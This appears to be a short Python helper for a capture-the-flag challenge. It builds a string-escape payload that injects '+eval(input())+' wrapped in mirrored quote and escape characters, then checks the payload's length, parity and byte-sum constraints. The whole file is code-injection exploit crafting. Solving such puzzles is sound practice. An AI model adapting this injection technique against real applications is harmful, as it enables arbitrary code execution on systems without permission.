code = """+eval(input())+"""

pad = "0" # use this to make sum(payload.encode()) % 256 == 69, at least one byte needed as well to prevent \' at end
payload = ("""'{c}\\'""" + code[::-1] + "'" + code + """'\\{d}'""").format(c=pad,d=pad[::-1])

if len(payload) % 2 == 1:
    print("payload is odd, works")
else:
    print("payload is even, doesn't work")

if len(payload) < 36:
    print(str(len(payload)) + ": payload len fits")
else:
    print(str(len(payload)) + ": payload len doesn't fit")

a = sum(payload.encode()) % 256
if a == 69:
    print(str(a) + ": sum(payload) works")
else:
    print(str(a) + ": sum(payload) doesn't work")

print()
print(payload)

